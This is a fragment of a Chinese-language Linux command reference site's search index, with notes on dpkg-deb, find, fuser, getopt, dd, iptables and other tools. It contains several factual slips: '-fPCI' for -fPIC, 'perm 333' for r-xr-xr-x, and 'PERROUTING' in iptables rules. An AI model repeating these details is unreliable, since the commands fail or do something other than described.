及数据到指定目录 打包 deb: dpkg-deb -b directory package.deb :将目录打包生成 deb 文件\ndpkg-deb -Z gzip -b dir package.deb :打包时使用 gzip 压缩 查看信息: dpkg-deb -I package.deb :显示 deb 的详细信息\ndpkg-deb -c package.deb :列出 deb 中的文件列表\ndpkg-deb -f package.deb :显示打包文件名 验证: dpkg-deb -W package.deb:验证 deb 文件的完整性 控制字段: --field=Field:Name :设置指定控制字段为 Name\n--field=Field: :删除指定控制字段 解压使用-x与-R区别 使用 -x解压的vscode包没有 DEBIAN目录, 使用 -R解压的有 解包行为略有不同: -x 选项进行解包时,只会解压 deb 包中的 data.tar.* 文件,也就是软件的实际文件。 而 -R 选项解包时,不仅会解压 data.tar. ,还会额外解压 control.tar. 文件。 control.tar.* 中包含了 deb 包的控制信息,其中就包括 /DEBIAN 目录和 control 等文件。 这主要是因为在多数情况下,我们解包只是为了获取软件文件本身,而不需要控制信息。\n所以 -x 提供了更简单的解包方式。\n但在需要完整解压调试 deb 包内部结构时,-R 解包则可以提供完整的内容。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-dpkg-deb.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-dpkg-deb.html"},{"title":"expr","text":"手工命令行计数器，用于在UNIX/LINUX下求表达式变量的值，一般用于整数值，也可用于字符串。 语法: expr 表达式 表达式说明: 用空格隔开每个项； 用反斜杠 放在 shell 特定的字符前面； 对包含空格和其他特殊字符的字符串要用引号括起来 例 计算字串长度: > expr length \"this is a test\"\n14 抓取字串: > expr substr \"this is a test\" 3 5\nis is 抓取第一个字符数字串出现的位置: > expr index \"sarasara\"  a\n2 整数运算: > expr 14 % 9\n5\n> expr 10 + 10\n20\n> expr 1000 + 900\n1900\n> expr 30 / 3 / 2\n5\n> expr 30 \\* 3 (使用乘号时，必须用反斜线屏蔽其特定含义。因为shell可能会误解显示星号的意义)\n90\n> expr 30 * 3\nexpr: Syntax error 补充 等价: ((i=$j+$k))     等价于 i=`expr $j + $k`\n((i=$j-$k))     等价于   i=`expr $j -$k`\n((i=$j*$k))     等价于   i=`expr $j \\*$k`\n((i=$j/$k))     等价于   i=`expr $j /$k` Let expressions 执行一个或多个表达式。表达式中的变量前不必有$.如果表达式中包含了空格或其他特殊字符，则必须引起来。 例: let \"I = I + 1\" 或 let i=i+1","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-exprr.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-exprr.html"},{"title":"file","text":"辨识文件类型 语法: file [-bcLvz][-f <名称文件>][-m <魔法数字文件>...][文件或目录...] 选项参数 常用: -b              列出辨识结果时，不显示文件名称。\n-c              详细显示指令执行过程，便于排错或分析程序执行的情形。\n-f<名称文件>                指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。\n-L                              直接显示符号连接所指向的文件的类别。\n-m<魔法数字文件>      指定魔法数字文件。\n-v                              显示版本信息。\n-z                              尝试去解读压缩文件的内容。\n[文件或目录...]      要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。 所有 --help display this help and exit -v , --version output version information and exit -m , --magic-file LIST use LIST as a colon-separated list of magic\nnumber files -M LIST use LIST as a colon-separated list of magic number files in place of default LIST                    use LIST as a colon-separated list of magic number files in place of default -z , --uncompress try to look inside compressed files -Z , --uncompress-noreport only print the contents of compressed files -b , --brief do not prepend filenames to output lines -c , --checking-printout print the parsed form of the magic file, use in\nconjunction with -m to debug a new magic file\nbefore installing it -d use default magic file\nuse default magic file -e , --exclude TEST exclude TEST from the list of test to be\nperformed for file. Valid tests are:\napptype, ascii, cdf, compress, csv, elf,\nencoding, soft, tar, json, text,\ntokens --exclude-quiet TEST like exclude, but ignore unknown tests -f , --files-from FILE read the filenames to be examined from FILE -F , --separator STRING use string as separator instead of : -i do not further classify regular files\ndo not further classify regular files -I , --mime output MIME type strings (--mime-type and\n--mime-encoding) --extension output a slash-separated list of extensions --mime-type output the MIME type --mime-encoding output the MIME encoding -k , --keep-going don't stop at the first match -l , --list list magic strength -L , --dereference follow symlinks -h , --no-dereference don't follow symlinks (default) -n , --no-buffer do not buffer output -N , --no-pad do not pad output -0 , --print0 terminate filenames with ASCII NUL -p , --preserve-date preserve access times on files -P , --parameter set file engine parameter limits\nbytes 1048576 max bytes to look inside file\nelf_notes     256 max ELF notes processed\nelf_phnum    2048 max ELF prog sections processed\nelf_shnum   32768 max ELF sections processed\nencoding   65536 max bytes to scan for encoding\nindir      50 recursion limit for indirection\nname      60 use limit for name/use magic\nregex    8192 length limit for REGEX searches -r , --raw don't translate unprintable chars to ooo -s , --special-files treat special (block/char devices) files as\nordinary ones -S , --no-sandbox disable system call sandboxing -C , --compile compile file specified by -m -D , --debug print debugging messages 用例 查看文件相关信息: yanque@yanquedembp Downloads % file *\n$RECYCLE.BIN:  directory\nmovie:         directory\nmushenji2.txt: Non-ISO extended-ASCII text, with very long lines (638), with CRLF line terminators 查看文件编码: yanque@yanquedembp Downloads % file --mime-encoding *\n\n$RECYCLE.BIN:  binary\nmovie:         binary\nmushenji2.txt: unknown-8bit\nmushenji.txt:  utf-8","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-file.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-file.html"},{"title":"find","text":"在指定目录下查找文件。 任何位于参数之前的字符串都将被视为欲查找的目录名。 如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。 语法: find   path   -option   [   -print ]   [ -exec   -ok   command ]   {} \\; find 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。\nexpression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。 匹配方式 -mount, -xdev 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件 -amin n 在过去 n 分钟内被读取过 -anewer file 比文件 file 更晚被读取过的文件 -atime n 在过去 n 天内被读取过的文件 -cmin n 在过去 n 分钟内被修改过 -cnewer file 比文件 file 更新的文件 -ctime n 在过去 n 天内创建的文件 -mtime n 在过去 n 天内修改过的文件. n为数字，表示n天之前的【一天之内】被改动过的文件 -empty 空的文件-gid n or -group name, gid 是 n 或是 group 名称是 name -ipath p, -path p 路径名称符合 p 的文件，ipath 会忽略大小写 -name name, -iname name 文件名称符合 name 的文件。iname 会忽略大小写 -size n 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数(字节)，k 表示 kilo bytes(kb)，w 是二个位元组, M(Mb), G(Gb), 可与 + - 搭配使用。 -type c 文件类型是 c 的文件. 支持参数, d 目录, c 字型装置文件, b 区块装置文件, p 具名贮列, f 一般文件, l 符号连结, s socket -pid n process id 是 n 的文件 -inum n 指定 inodenum 为n -newer file file作为一个存在的文件，列出比file更新的文件 -user user 文件属主为user -group group 文件属组为group -perm 文件权限 -maxdepth 递归查找层数 -delete 对于所有检索到的项目进行删除操作 -exec 执行指定命令 -samefile 查看有哪些相同的文件, 比如当你知道一个文件, 想知道它有被哪些链接了 你可以使用 ( ) 将运算式分隔，并使用下列运算: exp1 -and exp2\n! expr\n-not expr\nexp1 -or exp2\nexp1, exp2\n\n# -and 等价于 -a\n# -or  等价于 -o 如检索 /usr 下文件名以 python 开头且类型为目录的文件: find /usr -type d -name 'python*' 该命令等同于: find /usr -type d -a -name 'python*' 更复杂的组合形式如: find / '(' -mmin -5 -o -mtime +50 ')' -a -type f 选项详解 mtime 文件修改时间: -mtime n        : 在过去 n 天内修改过的文件. n为数字，表示n天之前的【一天之内】被改动过的文件\n-mtime +n       : 列出n天之前被改动过的文件【不包含n天】\n-mtime -n       : 列出n天之后被改动过的文件【包含n天】 type 文件类型: -type d 目录\n-type c 字型装置文件\n-type b 区块装置文件\n-type p 具名贮列\n-type f 一般文件\n-type l 符号连结\n-type s socket size 文件大小(对于目录来说没有意义): c 字节\nk kb\nM Mb\nG Gb 可与 +, - 搭配使用, 如检索文件大小高于 1 GB 的文件: find / -size +1G perm 文件权限 如搜索 /usr 目录下所有权限为 r-xr-xr-x（即系统中的所有用户都只有读写权限）的文件和目录， 可以使用以下命令: find /usr -perm a=rx 或者: find /usr -perm u=rx,g=rx,o=rx 亦可直接使用数字的形式: find /usr -perm 333 若仅需要匹配某一个字集: # /a=x 中的 / 表示仅匹配权限子集. 即只要有执行权限即可.\nfind /usr -perm /a=x maxdepth find默认是递归检索项目的, 可使用 -maxdepth 限制递归查找层数. 如搜索时向下递归的层数最大为 3: find / -maxdepth 3 exec 执行自定义命令 如将 home 目录下所有的 py 文件复制到 bak 目录下: find ~ -type f -name '*.py' -exec cp {} bak ';' 其中的大括号（{}）作为检索到的文件的 占位符 ，而分号作为命令结束的标志。因为分号是 Shell 中有特殊含义的符号，所以需要使用单引号括起来, 或者用 \\ 也可。 +的作用 多文件打包: # + 表示多个文件都一起打包在此处, 否则最终压缩包内只有一个py文件\nfind ~ -type f -name '*.py' -exec tar -czvf py_file.tar.gz {} +","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-find.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-find.html"},{"title":"fuser","text":"安装: apt install psmisc 显示出当前哪个程序在使用磁盘上的某个文件、挂载点、甚至网络端口，并给出程序进程的详细信息 语法: fuser(选项)(参数) 访问类型: - c：代表当前目录\n- e：将此文件作为程序的可执行对象使用\n- f：打开的文件。默认不显示。\n- F：打开的文件，用于写操作。默认不显示。\n- r：指示该目录为进程的根目录\n- m：指示进程使用该文件进行内存映射，抑或该文件为共享库文件，被进程映射进内存\n- s：将此文件作为共享库（或其他可装载对象）使用 常用选项: -a：显示所有命令行中指定的文件，默认情况下被访问的文件才会被显示。\n-c：和-m一样，用于POSIX兼容。\n-k：杀掉访问文件的进程。如果没有指定-signal就会发送SIGKILL信号。\n-i：杀掉进程之前询问用户，如果没有-k这个选项会被忽略。\n-l：列出所有已知的信号名称。\n-m：name 指定一个挂载文件系统上的文件或者被挂载的块设备（名称name）。这样所有访问这个文件或者文件系统的进程都会被列出来。如果指定的是一个目录会自动转换成\"name/\",并使用所有挂载在那个目录下面的文件系统。\n-n：space 指定一个不同的命名空间(space).这里支持不同的空间文件(文件名，此处默认)、tcp(本地tcp端口)、udp(本地udp端口)。对于端口， 可以指定端口号或者名称，如果不会引起歧义那么可以使用简单表示的形式，例如：name/space (即形如:80/tcp之类的表示)。\n-s：静默模式，这时候-u,-v会被忽略。-a不能和-s一起使用。\n-<signal>：使用指定的信号，而不是用SIGKILL来杀掉进程。可以通过名称或者号码来表示信号(例如-HUP,-1),这个选项要和-k一起使用，否则会被忽略。\n-u：在每个PID后面添加进程拥有者的用户名称。\n-v：详细模式。输出似ps命令的输出，包含PID,USER,COMMAND等许多域,如果是内核访问的那么PID为kernel.  -V 输出版本号。\n-4：使用IPV4套接字,不能和-6一起应用，只在-n的tcp和udp的命名存在时不被忽略。\n-6：使用IPV6套接字,不能和-4一起应用，只在-n的tcp和udp的命名存在时不被忽略。\n- 重置所有的选项，把信号设置为SIGKILL. 参数: 文件：可以是文件名或者TCP、UDP端口号 fuser可以发送它已知的信号给访问的指定文件进程而代替-k参数默认发送的SIGKILL: [root@_mongodb_117 ~]# fuser -v /root/install.log\n用户     进程号 权限   命令\n/root/install.log:   root       3347 f.... tail\n[root@_mongodb_117 ~]# fuser -k -SIGHUP /root/install.log\n/root/install.log:    3347\n[root@_mongodb_117 ~]# fuser -v /root/install.log 杀掉打开readme文件的程序, 这里，会在kill之前询问是否确定。最好加上-v以便知道将要杀那个进程: $fuser -m -k -i readme","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-fuseer.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-fuseer.html"},{"title":"g++","text":"一般用于编译C++ 选项: -I <dir> 指定头文件所在目录, 会优先找此处指定的目录 -l <dir> 指定需要链接的库名，用于告诉链接器需要链接哪些库文件\n即指定动态库的名称(去掉lib前缀和.so后缀) -L <dir> 指定动态库搜索路径 -f no-lto 禁用链接时优化（LTO）\n当使用该选项编译源代码时，编译器将不会进行链接时优化，\n这可能会导致一些性能上的损失，但也可以避免某些链接错误。 -s hared 生成动态库(.so文件),而不是静态库(.a文件) -f PIC 生成位置无关代码(position-independent code),\n使得代码可以在不同的内存地址执行,这对于动态库是必需的 -g 在编译过程中生成调试信息(debugging information),\n并将其嵌入到最终的可执行文件或目标文件中。\n带有调试信息的可执行文件可以用调试器(debugger)来调试和跟踪代码 -c 仅编译,不链接。只生成目标文件(.o文件),不生成可执行文件。 对于 -c 选项的说明 通常g++的使用流程是: 编译源文件(.c或.cpp)生成目标文件(.o文件),使用-c选项 链接多个目标文件和库文件,生成可执行文件,使用-o选项指定输出文件 所以-c选项使得编译和链接成两个步骤进行。比如: g++ -c hello.c  # 仅编译,生成hello.o\ng++ -c main.c   # 仅编译,生成main.o\ng++ hello.o main.o -o hello # 链接目标文件生成可执行文件 如果不使用-c选项,g++会自动执行编译和链接两个步骤,例如: g++ hello.c main.c -o hello  # 会编译hello.c和main.c,然后链接生成可执行文件hello 例-生成静态库文件和共享库文件 编译myfile.cpp: g++ -c myfile.cpp 注解 静态库文件和共享库文件都是由.o目标文件生成 生成共享库文件libmy.so: g++ -shared -fPCI -o libmy.so myfile.o 打包成静态库文件libmy.a: ar -r libmy.a myfile.o\n# ar: creating libmy.a","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-g-++.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-g-++.html"},{"title":"getfattr","text":"get extended attributes of filesystem objects 获取文件系统扩展属性信息(用 setfattr 命令设置的属性) 语法格式: getfattr [参数] 文件名 常用参数： -d 显示所有扩展属性值 -e 设置编码值类型 -h 不引用符号链接 -m 包括名称匹配正则表达式模式的属性 -n 显示已命名的扩展属性值 -P 跳过所有符号链接 -R 递归处理所有子文件 --help 显示帮助信息 --version 显示版本信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-getfattr.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-getfattr.html"},{"title":"getopt","text":"getopt选项字符串: \"a:b:cd::e\"，这就是一个选项字符串。对应到命令行就是-a ,-b ,-c ,-d, -e 。\n冒号又是什么呢？ 冒号表示参数，\n一个冒号就表示这个选项后面必须带有参数（没有带参数会报错哦），\n但是这个参数可以和选项连在一起写，也可以用空格隔开，比如-a123 和-a   123（中间有空格） 都表示123是-a的参数；\n两个冒号的就表示这个选项的参数是可选的，即可以有参数，也可以没有参数，\n但要注意有参数时，参数与选项之间不能有空格（有空格会报错），这一点和一个冒号时是有区别的。 -o或--options选项后面是可接受的短选项，如ab:c::，表示可接受的短选项为-a -b -c，其中-a选项不接参数，-b选项后必须接参数，-c选项的参数为可选的\n-l或--long选项后面是可接受的长选项，用逗号分开，冒号的意义同短选项。\n-n选项后接选项解析错误时提示的脚本名字 常用参数 -a 允许长选项以单个字符\"-\"开始 -n 指定一个程序，供getopt(3)函数输出错误信息时使用 -o 识别单字符的短选项 -q 禁止输出错误信息 -l 识别多字符的长选项 自己写过的一个例子, 至少需要一个短选项 : #sh ./test.sh -l --warn ww --error ee --info ii --fatal ff\n\n# ARGS=\"getopt -o h -l warn:,error:,info:,fatal: -- $@\"\n# eval set -- \"${ARGS}\"\n\ngetopt -o h -l warn:,error:,info:,fatal: -- $@\n\nwhile true\ndo\n    case \"$1\" in\n        --warn)\n            echo \"warn: i am $2\"\n            shift 2\n            ;;\n        --error)\n            echo \"error: i am $2\"\n            shift 2\n            ;;\n        --info)\n            echo \"info: i am $2\"\n            shift 2\n            ;;\n        --fatal)\n            echo \"fatal: i am $2\"\n            shift 2\n            ;;\n        --)\n            shift\n            break\n            ;;\n        *)\n            echo \"error---$1 $2\"\n            break\n            ;;\n    esac\ndone getopt的区别与分类 上述例子有问题, 此处再重新介绍一下. getopt有三种 getopt标准版: 只能识别短选项; getopt增强版: 短选项长选项皆可; getopts: 只能识别短选项(严格来说可能也不能放在这) 其中, 识别getopt是标准版还是增强版可使用-T: getopt -T 标准版输出如下: $ getopt -T\n--\n$ echo $?\n0 增强版输出如下: root@67a43e314058:~# getopt -T\nroot@67a43e314058:~# echo $?\n4 下面代码基于增强版编写, 注意对选项参数的定义: ARGS=$(getopt -o hu: -l help,user:,age:,name:: -- \"$@\") 长选项使用 --long 或 -l 皆可, 测试: root@67a43e314058:~# sh t_getopt.sh -u yq --name=11 --age 10\nARGS:::  -u 'yq' --name '11' --age '10' --\nuser:yq\nage:10\nname:11\nroot@67a43e314058:~# sh t_getopt.sh -u yq --name 11 --age 10\nARGS:::  -u 'yq' --name '' --age '10' -- '11'\nuser:yq\nage:10\nname: 可以看出 --name=11 与 --name 11 的结果是不一样的, 后者没有成功赋值到name,\n这是因为getopt解析时限定为 name:: (双冒号). 两个冒号表示参数可选, 在debian11上默认空格选择的是非选项参数(不知其他系统是不是亦是).\n如果要规避可以使用一个冒号表示参数必选. 注解 无冒号表示选项不带参数;\n一个冒号表示选项必须指定参数;\n两个冒号表示选项参数可选. getopt作用说明 从上一节 getopt的区别与分类 的例子中可以看出,\n其作用只是对命令行输入的参数做了一个校验与规范化,\n实际 eval set -- \"${ARGS}\" 前后的 ARGS 都是一致的,\n那么这句eval 是不是必须的呢? 是. eval set -- \"${ARGS}\" 的作用是将 ${ARGS} 中的字符串解析为命令行参数，并赋值给脚本中的位置参数。 \"${ARGS}\" 使用双引号将整个字符串括起来，这样可以确保参数中存在的空格不会被解释为分隔符。 set -- \"${ARGS}\" 将 ${ARGS} 中的字符串按照空格进行拆分，并将拆分后的结果设置为脚本的位置参数。\n位置参数是脚本中可用于访问传递到脚本的参数的特殊变量，它们被存储在 $1、$2、$3 等变量中。\n注意: 此时的结果是一个整体字符串, 还需要使用eval才能将其拆分为正常的多个参数字符串 eval 命令用于执行由 set -- \"${ARGS}\" 生成的命令，将其作为有效的Shell命令执行。\n通过使用 eval 命令，我们可以将 ${ARGS} 中的字符串解析为实际的命令行参数，以便在脚本中使用这些参数进行进一步的处理或操作。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-getopt.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-getopt.html"},{"title":"gnome-terminal","text":"主要适用于gnome的图形化桌面系统, 用于打开一个新的终端 打开一个终端并执行ls: gnome-terminal -- ls 打开一个终端并执行ls, 执行后不退出: gnome-terminal -- bash -c 'ls ; bash'","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-gnome-Terminal.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-gnome-Terminal.html"},{"title":"gzip","text":"压缩/解压文件, 压缩包后缀名一般为.gz 语法: gzip [选项] 被压缩文件 常用选项： -d 解压 -r 压缩所有子目录 注解 tar的 -z选项就是调用的gzip压缩","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-gzip.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-gzip.html"},{"title":"halt","text":"halt 命令通知硬件来停止所有的 CPU 功能，但是仍然保持通电。\n你可以用它使系统处于低层维护状态。注意在有些情况会它会完全关闭系统。 停止机器: halt 关闭机器、关闭电源: halt -p 重启机器: halt --reboot","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-halt.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-halt.html"},{"title":"hash","text":"每个SHELL都有一个独立的hash表, 初始时候为空, 可直接hash查看当前SHELL的hash表: hash 每当你执行过一条命令时，hash表会记录下这条命令的路径，就相当于缓存一样。\n第一次执行命令shell解释器默认的会从PATH路径下寻找该命令的路径，\n当你第二次使用该命令时，shell解释器首先会查看hash表，没有该命令才会去PATH路径下寻找 hash表的作用：大大提高命令的调用速率 不带参数, 查看当前已有的表, hash表会记录下执行命令的次数，以及该命令的绝对路径 选项: -l 既可以看到hash表命令的路径，也可以看到它的名字及别名 -p <cmd new_name> 给已有的指令 cmd 重命名为 new_name (起别名),\n如: hash -p /bin/ls bb 之后直接 bb 调用的就是ls了 -t <cmd> 查看 cmd 在hash表中存储的路径, 没有就直接报错没找到 -r 清空hash表 -d <cmd> 仅清除某一个hash记录","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-have.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-have.html"},{"title":"iconv","text":"iconv 转换指定文件的编码，默认输出到标准输出设备，亦可指定输出文件 使用: iconv [options] [file] 选项参数 -f , --from-code= encode-name 原始文本编码 -t , --to-code= encode-name 输出编码 -l , --list 列举所有已知的字符集 -c 从输出中忽略无效的字符 -o , --output= FILE 输出文件 -s , --silent 关闭警告 --verbose 打印进度信息 用例 将文件以 gbk 编码读出, 并转化为 utf8 编码, 重定向到 b.txt: # 有次mac下载了一本小说, 打开乱码, page的自动识别编码没法用\n# 又没有notpad++这种工具, vscode倒是可以切换编码, 但是保存的时候存在问题.\n# 只好用命令转换了\niconv -f gbk -t utf8 -c mushenji2.txt >b.txt","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-iconv-(mac).html","loc":"/yq-docs-operating-system-linux-Linux-instruction-iconv-(mac).html"},{"title":"ifstat","text":"查看实时网速 安装(Debian/Ubuntu): apt install ifstat","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ifStat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ifStat.html"},{"title":"dd","text":"复制文件并对原文件的内容进行转换和格式化处理: bs=<字节数>：将ibs（输入）与obs（输出）设成指定的字节数；\ncbs=<字节数>：转换时，每次只转换指定的字节数；\nconv=<关键字>：指定文件转换的方式；\ncount=<区块数>：仅读取指定的区块数；\nibs=<字节数>：每次读取的字节数；\nobs=<字节数>：每次输出的字节数；\nif=<文件>；代表输入文件\nof=<文件>：输出到文件；\nseek=<区块数>：一开始输出时，跳过指定的区块数；\nskip=<区块数>：一开始读取时，跳过指定的区块数；\n--help：帮助；\n--version：显示版本信息。 例如生成10g的大文件: dd if=/dev/zero of=test bs=1M count=0 seek=10000    #不占空间\ndd if=/dev/zero of=test bs=10G count=1 读取位于地址 0x1000 的 4 字节数据: # /dev/mem 代表物理内存\ndd if=/dev/mem bs=4 count=1 skip=$((0x1000)) status=none | od -t x4 -An 拓展-Win下读取指定内存地址数据 使用 WinDbg 调试器 WinDbg 是 Windows 平台上使用的强大调试器工具。\n使用 WinDbg，您可以打开一个进程的内存空间并读取指定地址的数据。 示例命令，在 WinDbg 中读取地址 0x1000 的 4 字节数据: > .open <进程名或进程ID>\n> db 0x1000 L4","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-in-the-end.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-in-the-end.html"},{"title":"iptables","text":"iptables其实不是真正的防火墙，可以理解为一个客户端代理，\n用户通过iptables这个代理，将用户的安全设定到对应的安全框架，\n而这个安全框架才是真正的防火墙，这个框架是 netfilter netfilter 才是防火墙真正的安全框架，位于内核空间.\nnetfilter 是linux操作系统核心层内部的一个数据包处理模块，具有如下功能： 网络地址转换（network address translate） 数据包内容修改 以及数据包过滤的防火墙功能 netfilter/iptables 组成linux平台下的包过滤防火墙。\n免费，可以替代昂贵的商业防火墙解决方案，完成封包过滤、封包重定向、网络地址转换（NAT）等功能。 虽然使用 service iptables restart 来启动服务，更准确的说，\niptables并没有一个守护进程，所以并不算是真正意义上的服务，而应该是内核提供的服务。 语法-选项 语法: iptables -t 表名 <-A/I/D/R> 规则链名 [规则号] <-i/o 网卡名> -p 协议名 <-s 源IP/源子网> --sport 源端口 <-d 目标IP/目标子网> --dport 目标端口 -j 动作\n\n#-A 指定链的末尾新增一个指定的规则\n#-I 链的指定位置插入一条或多条规则\n#-D 指定链的chain中删除一条或者多条规则\n#-R num 替换/修改第几条规则\n\n#-P 设置默认规则 选项 -P 设置默认策略:iptables -P INPUT (DROP -F 清空规则链 -L 查看规则链 -A 在规则链的末尾加入新规则 -I num 在规则链的头部加入新规则 -D num 删除某一条规则 -s 匹配来源地址IP/MASK，加叹号\"!\"表示除这个IP外。 -d 匹配目标地址 -i 网卡名称 匹配从这块网卡流入的数据 -o 网卡名称 匹配从这块网卡流出的数据 -p 匹配协议,如tcp,udp,icmp --dport num 匹配目标端口号 --sport num 匹配来源端口号 -n 表示不对 IP 地址进行反查，加上这个参数显示速度将会加快。 -v 表示输出详细信息，包含通过该规则的数据包数量、总字节数以及相应的网络接口。 -m 表示使用模块 参考: https://www.zsythink.net/archives/1199 如: iptables -t nat -A PERROUTING -p tcp -s 10.10.10.10 --sport 67 -d 10.10.10.11 --dport 67 -j ACCEPT\n\n# 这里如果是多端口可能会出现不能识别sport的情况 需搭配multiport\n# multiport多端口，\"，\"表示或，\"：\"表示区间\niptables -t nat -A PERROUTING -p tcp -s 10.10.10.10 -m multiport --sport 67，68 -d 10.10.10.11 --dport 67 -j ACCEPT -j 的几种动作 ACCEPT        #接收数据包\nDROP        #丢弃数据包\nREDIRECT    #重定向，映射,透明代理\nSNAT        #源地址转换\nDNAT        #目标地址转换\nMASQUERADE    #IP伪装（NAT），用于ADSL\nLOG            #日志记录 iptables默认链 INPUT 处理输入数据包 OUTPUT 处理输出数据包 FORWARD 处理转发数据包 PERROUTING 用于目标地址转换（DNAT） POSTROUTING 用于源地址转换（SNAT） 过滤框架 如果是外部主机发送数据包给防火墙本机，数据将会经过 PREROUTING 链与 INPUT 链； 如果是防火墙本机发送数据包到外部主机，数据将会经过 OUTPUT 链与 POSTROUTING 链； 如果防火墙作为路由负责转发数据，则数据将经过 PREROUTING 链、FORWARD 链以及 POSTROUTING 链。 四种表 filter 过滤功能，只能作用在三个链上面：INPUT,FORWARD,OUTPUT nat 地址转换，只能作用在：PREROUTING,OUTPUT,POSTROUTING(centos 7中还有INPUT) mangle 修改报文原数据，五个链都可以 raw 关闭nat启用的追踪机制，PREROUTING,OUTPUT 换种方式: # 链                表\nprerouting        raw --> mangle --> nat\ninput            mangle --> filter (centos7 has nat, 6 not)\nforward            mangle --> filter\noutput            raw --> mangle --> nat --> filter\npostrouting        mangle --> nat 常用的一些命令 常用的一些命令: iptables -F        # 清空所有的防火墙规则\niptables -nvL      # 查看三个链\n\niptables -X INPUT  # 删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。\n                   # 如果没有指定链名，则会删除该表中所有非内置的链。\niptables -Z INPUT  # 把指定链，或者表中的所有链上的所有计数器清零。\n\niptables -L [-t 表名] [链名]    # 列出已设置的规则 -m的一些模块 multiport 多端口匹配 可用于匹配非连续或连续端口；最多指定15个端口； 实例: iptables -A INPUT -p tcp -m multiport --dport 22,80 -j ACCEPT\niptables -A OUTPUT -p tcp -m multiport --sport 22,80 -j ACCEPT iprange 匹配指定范围内的地址 匹配一段连续的地址而非整个网络时有用 实例: iptables -A INPUT -p tcp -m iprange --src-range 192.168.118.0-192.168.118.60 --dport 22 -j ACCEPT\niptables -A OUTPUT -p tcp -m iprange --dst-range 192.168.118.0-192.168.118.60 --sport 22 -j ACCEPT string 字符串匹配，能够检测报文应用层中的字符串 字符匹配检查高效算法：kmp, bm,\n能够屏蔽非法字符 实例: #注意该条规则需要添加到OUTPUT链，当服务端返回数据报文检查到有关键字\"sex\"时，则丢弃该报文，可用于web敏感词过滤\niptables -A OUTPUT -p tcp --dport 80 -m string --algo kmp --string \"sex\" -j DROP connlimit 连接数限制，对每IP所能够发起并发连接数做限制； 默认INPUT 为 DROP. 每个ip对ssh服务的访问最大为3个并发连接，超过则丢弃: iptables -A INPUT -p tcp  --dport 22 -m connlimit ! --connlimit-above 3 -j ACCEPT limit 速率限制 limit-burst 设置默认阀值 默认放行10个，当到达limit-burst阀值后，平均6秒放行1个: iptables -A INPUT -p icmp -m limit --limit 10/minute --limit-burst 10 -j ACCEPT state 状态检查 连接追踪中的状态： NEW: 新建立一个会话 ESTABLISHED：已建立的连接 RELATED: 有关联关系的连接 INVALID: 无法识别的连接 放行ssh的首次连接状态: iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT 详细点 INVALID：无效的封包，例如数据破损的封包状态 ESTABLISHED：已经联机成功的联机状态； NEW：想要新建立联机的封包状态； RELATED：这个最常用！表示这个封包是与我们主机发送出去的封包有关， 可能是响应封包或者是联机成功之后的传送封包！这个状态很常被设定，因为设定了他之后，只要未来由本机发送出去的封包，即使我们没有设定封包的 INPUT 规则，该有关的封包还是可以进入我们主机， 可以简化相当多的设定规则。 相关指令 iptables-save iptables-restore 问题--sport不能识别 --sport一直不能识别，百度也没查到原因 询问才知道。需要配合指定协议与multiport来匹配多端口才可以 端口如果使用 冒号 表示连续端口","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-iptables.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-iptables.html"},{"title":"iptables-restore","text":"批量导入Linux防火墙规则 例如将/tmp/iptables.txt规则写入iptables: iptables-restore < /tmp/iptables.txt 注解 备份恢复时， iptables-save 、\niptables-restore\n两个都需要搭配重定向符使用","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-iptables-restore.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-iptables-restore.html"},{"title":"iptables-save","text":"批量导出Linux防火墙规则， 直接执行：显示当前启用的所有规则，按raw、mangle、nat、filter顺序列出 -c 指定在还原iptables表时候，还原当前的数据包计数器和字节计数器的值； -t 指定表 \"#\"号开头的表示注释； \"*表名\"表示所在的表； \"：链名默认策略\"表示相应的链及默认策略，具体的规则部分省略了命令名\"iptables\"； \"COMMIT\"表示提交前面的规则设置； 注解 备份恢复时，\niptables-save、 iptables 两个都需要搭配重定向符使用 以前记的, 现在不记得啥意思: # 这是注释\n*nat\n# 